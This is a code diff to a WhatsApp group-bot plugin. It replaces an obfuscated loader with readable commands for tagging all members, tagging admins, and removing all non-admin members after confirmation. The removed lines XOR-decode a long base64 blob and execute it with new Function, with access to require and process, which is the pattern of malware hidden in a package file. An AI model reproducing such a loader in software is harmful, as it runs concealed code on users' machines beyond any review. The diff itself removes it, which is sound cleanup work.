@@ -1,9 +1,56 @@
 'use strict';
-(function(){
-  const K=Buffer.from('REVDQU5YTUQtMjAyNg==','base64');
-  const D='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';
-  const X=Buffer.from(D,'base64');
-  for(let i=0;i<X.length;i++) X[i]^=K[i%K.length];
-  const C=X.toString('utf8');
-  return (new Function('require','module','exports','__filename','__dirname','process','Buffer',C))(require,module,exports,__filename,__dirname,process,Buffer);
-})();
+/**
+ * Group power tools:
+ *   .tagall [message]      mention every member (admins only)
+ *   .tagadmins [message]   mention all admins (anyone, once per 30s per group, handy for reports)
+ *   .kickall yes           remove every non-admin member (admins only, needs confirmation)
+ */
+const U = require('../lib/util');
+const { UserError, bold, sleep } = U;
+
+const chunk = (a, n) => { const out = []; for (let i = 0; i < a.length; i += n) out.push(a.slice(i, i + n)); return out; };
+
+module.exports = ({ def }) => {
+  const num = (ctx, id) => ctx.jidUser(id);
+
+  def(['tagall', 'everyone'], { cat: 'group', group: true, admin: true, usage: 'tagall [message]', desc: 'Mention every member of the group with an optional message.' }, async ctx => {
+    const meta = await ctx.group();
+    const ids = meta.participants.map(p => p.id);
+    const note = ctx.args || '📢 Attention everyone!';
+    const parts = chunk(ids, 250);
+    for (let i = 0; i < parts.length; i++) {
+      const list = parts[i].map((id, k) => `${i * 250 + k + 1}. @${num(ctx, id)}`).join('\n');
+      await ctx.send({ text: `${i === 0 ? `${note}\n\n` : ''}${list}`, mentions: parts[i] }, i === 0 ? { quoted: ctx.msg } : {});
+      if (i < parts.length - 1) await sleep(800);
+    }
+  });
+
+  def(['tagadmins', 'admin', 'calladmins'], { cat: 'group', group: true, usage: 'tagadmins [message]', desc: 'Mention all group admins (use it to report a problem).' }, async ctx => {
+    const last = (ctx.rt.tagAdminsAt ||= new Map());
+    if (Date.now() - (last.get(ctx.chat) || 0) < 30000 && !ctx.isOwner) throw new UserError('Admins were just tagged. Please wait a moment.');
+    const meta = await ctx.group();
+    const admins = meta.participants.filter(p => ctx.isAdminP(p)).map(p => p.id);
+    if (!admins.length) throw new UserError('No admins found in this group.');
+    last.set(ctx.chat, Date.now());
+    await ctx.send({ text: `🛡️ ${bold('Calling the admins')}${ctx.args ? `\n${ctx.args}` : ''}\n\n${admins.map(id => `@${num(ctx, id)}`).join('\n')}`, mentions: admins }, { quoted: ctx.msg });
+  });
+
+  def(['kickall', 'removeall'], { cat: 'group', group: true, admin: true, botAdmin: true, usage: 'kickall yes', desc: 'Remove every non-admin member from the group. Admins and the bot owner stay. Needs "yes" to confirm.' }, async ctx => {
+    const meta = await ctx.group();
+    const ownerNum = num(ctx, ctx.ownerJid);
+    const targets = meta.participants.filter(p => !ctx.isAdminP(p) && num(ctx, p.id) !== ownerNum && num(ctx, p.id) !== ctx.senderNum).map(p => p.id);
+    if (!targets.length) throw new UserError('There are no regular members to remove.');
+    if ((ctx.argv[0] || '').toLowerCase() !== 'yes') throw new UserError(`⚠️ This removes ${bold(String(targets.length))} non-admin member${targets.length > 1 ? 's' : ''} from the group. Admins stay.\nConfirm with *${ctx.var('PREFIX')}kickall yes*.`);
+    await ctx.reply(`🧹 Removing ${targets.length} member${targets.length > 1 ? 's' : ''}…`, { title: 'Kick all' });
+    let removed = 0, failed = 0;
+    for (const batch of chunk(targets, 10)) {
+      try {
+        const res = await ctx.sock.groupParticipantsUpdate(ctx.chat, batch, 'remove');
+        const bad = Array.isArray(res) ? res.filter(r => String(r?.status) !== '200').length : 0;
+        removed += batch.length - bad; failed += bad;
+      } catch { failed += batch.length; }
+      await sleep(batch === targets.slice(-batch.length) ? 0 : 1500);
+    }
+    await ctx.reply(`✅ Removed: ${bold(String(removed))}${failed ? `\n⚠️ Could not remove: ${failed}` : ''}`, { title: 'Kick all' });
+  });
+};
